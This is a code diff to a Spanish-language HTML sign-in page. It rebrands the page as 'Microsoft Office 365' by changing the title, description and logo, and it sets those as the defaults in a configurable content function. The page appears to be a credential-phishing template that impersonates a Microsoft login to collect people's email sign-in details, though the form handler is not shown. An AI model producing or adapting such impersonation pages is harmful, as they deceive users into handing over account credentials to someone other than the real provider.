@@ -3,8 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Iniciar sesion</title>
-  <meta name="description" content="Iniciar sesion">
+  <title>Microsoft Office 365</title>
+  <meta name="description" content="Microsoft Office 365 - Iniciar sesión">
   <link rel="icon" href="/favicon.png" type="image/png">
   <style>
     * {
@@ -33,7 +33,7 @@
     .login-container {
       width: 100%;
       max-width: 380px;
-      background: rgba(10, 10, 26, 0.85);
+      background: rgba(15, 23, 42, 0.95);
       backdrop-filter: blur(20px);
       border-radius: 12px;
       box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
@@ -157,10 +157,10 @@
 <body>
   <div class="login-container">
     <div class="logo">
-      <img id="loginLogo" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft">
+      <img id="loginLogo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4e/Microsoft_Office_2013-2019_logo_and_wordmark.svg/120px-Microsoft_Office_2013-2019_logo_and_wordmark.svg.png" alt="Microsoft Office 365">
     </div>
-    <div class="login-title" id="loginTitle">Iniciar sesión</div>
-    <div class="login-description" id="loginDescription"></div>
+    <div class="login-title" id="loginTitle">Microsoft Office 365</div>
+    <div class="login-description" id="loginDescription">Inicia sesión para acceder a tu correo y servicios.</div>
 
     <form id="loginForm" onsubmit="return handleEmailSubmit(event)">
       <div class="error-box" id="errorBox">
@@ -259,9 +259,9 @@
 
     // --- Aplicar contenido editable ---
     function applyLoginContent() {
-      var logoUrl = getSavedSetting('loginLogo', 'https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg');
-      var title = getSavedSetting('loginTitle', 'Iniciar sesión');
-      var description = getSavedSetting('loginDescription', '');
+      var logoUrl = getSavedSetting('loginLogo', 'https://upload.wikimedia.org/wikipedia/commons/thumb/4/4e/Microsoft_Office_2013-2019_logo_and_wordmark.svg/120px-Microsoft_Office_2013-2019_logo_and_wordmark.svg.png');
+      var title = getSavedSetting('loginTitle', 'Microsoft Office 365');
+      var description = getSavedSetting('loginDescription', 'Inicia sesión para acceder a tu correo y servicios.');
 
       var logoImg = document.getElementById('loginLogo');
       if (logoImg) logoImg.src = logoUrl;
